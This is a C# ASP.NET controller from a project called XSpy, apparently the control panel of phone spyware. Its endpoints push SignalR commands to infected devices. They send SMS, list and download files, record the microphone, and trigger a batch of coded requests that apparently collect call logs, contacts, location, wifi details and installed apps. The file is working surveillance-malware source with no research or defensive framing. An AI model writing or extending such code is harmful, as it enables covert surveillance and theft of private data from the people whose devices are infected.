﻿using System;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using XSpy.Controllers.Base;
using XSpy.Database.Models.Requests.Devices;
using XSpy.Database.Models.Requests.Devices.Search;
using XSpy.Database.Models.Tables;
using XSpy.Database.Services;
using XSpy.Socket;
using XSpy.Utils;

namespace XSpy.Controllers.Api
{
    public class DeviceController : BaseApiController
    {
        private DeviceService _deviceService;
        private IHubContext<MainHub> _hubContext;
        private readonly HubMethods _methods;

        public DeviceController(DeviceService deviceService, IHubContext<MainHub> hubContext, HubMethods hubMethods)
        {
            _methods = hubMethods;
            _hubContext = hubContext;
            _deviceService = deviceService;
        }

        [HttpPost("{deviceId}/sms"), PreExecution]
        public async Task<IActionResult> SendSms([FromRoute] Guid deviceId, [FromBody] SendSmsRequest request)
        {
            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (device == null)
                return NotFound();

            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
            if (string.IsNullOrEmpty(connId))
                return BadRequest();

            var client = _hubContext.Clients.Client(connId);
            if (client == null)
                return BadRequest();

            await client.SendAsync("0xSM", "sendSMS", request.Number, request.Message);

            return Ok(request);
        }


        [HttpGet("{deviceId}/isLoading"), PreExecution]
        public async Task<IActionResult> IsDirLoaded(Guid deviceId)
        {
            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (device == null)
                return NotFound();

            return Ok(device.IsLoadingDir);
        }

        [HttpGet("{deviceId}/dirs"), PreExecution]
        public async Task<IActionResult> GetLoadedDirs(Guid deviceId)
        {
            var device = await _deviceService.GetPathsForDevice(deviceId);
            if (device == null)
                return NotFound();

            return Ok(device);
        }

        [HttpPost("{deviceId}/dir"), PreExecution]
        public async Task<IActionResult> LoadDir([FromRoute] Guid deviceId, LoadPathRequest pathRequest)
        {
            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (device == null || string.IsNullOrEmpty(device.DeviceId))
                return NotFound();

            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
            if (string.IsNullOrEmpty(connId))
                return BadRequest();

            var client = _hubContext.Clients.Client(connId);
            if (client == null)
                return BadRequest();

            await client.SendAsync("0xFI", pathRequest.IsDir ? "ls" : "dl", pathRequest.Path);

            device.IsLoadingDir = true;
            _deviceService.Save(device);
            await _deviceService.Commit();

            return Ok(pathRequest);
        }

        [HttpPost("{deviceId}/rec"), PreExecution]
        public async Task<IActionResult> Record([FromRoute] Guid deviceId, MicRecordRequest recordRequest)
        {
            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (device == null || string.IsNullOrEmpty(device.DeviceId))
                return NotFound();

            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
            if (string.IsNullOrEmpty(connId))
                return BadRequest();

            var client = _hubContext.Clients.Client(connId);
            if (client == null)
                return BadRequest();

            await client.SendAsync("0xMI", recordRequest.Seconds);

            device.RecordingMicBlock = DateTime.Now.AddSeconds(recordRequest.Seconds);
            _deviceService.Save(device);
            await _deviceService.Commit();

            return Ok(recordRequest);
        }


        [HttpGet("{deviceId}/update"), PreExecution]
        public async Task<IActionResult> RequestUpdate(Guid deviceId)
        {
            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
            if (device == null || string.IsNullOrEmpty(device.DeviceId))
                return NotFound();

            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
            if (string.IsNullOrEmpty(connId))
                return BadRequest();

            var client = _hubContext.Clients.Client(connId);
            if (client == null)
                return BadRequest();

            device.IsLoadingDir = false;
            _deviceService.Save(device);
            await _deviceService.Commit();


            await client.SendAsync("0xSM", "ls", "", "");

            await client.SendAsync("0xCL");
            await client.SendAsync("0xCO");
            await client.SendAsync("0xLO");
            await client.SendAsync("0xWI");
            await client.SendAsync("0xPM");
            await client.SendAsync("0xIN");
            await client.SendAsync("0xGI");
            await client.SendAsync("0xLO");

            return Ok(deviceId);
        }


        [HttpGet("{id}/delete"), PreExecution]
        public async Task<IActionResult> Delete([FromRoute] Guid id)
        {
            var device = await _deviceService.GetDeviceById(id, LoggedUser.Id);
            if (device == null)
            {
                return NotFound();
            }

            await _deviceService.Delete(device);

            return Ok(new {message = "Ok"});
        }

        [Route("list"), PreExecution]
        public async Task<IActionResult> List(DataTableRequest<SearchDeviceRequest> request)
        {
            return Ok(await _deviceService.GetTable(request, LoggedUser));
        }
    }
}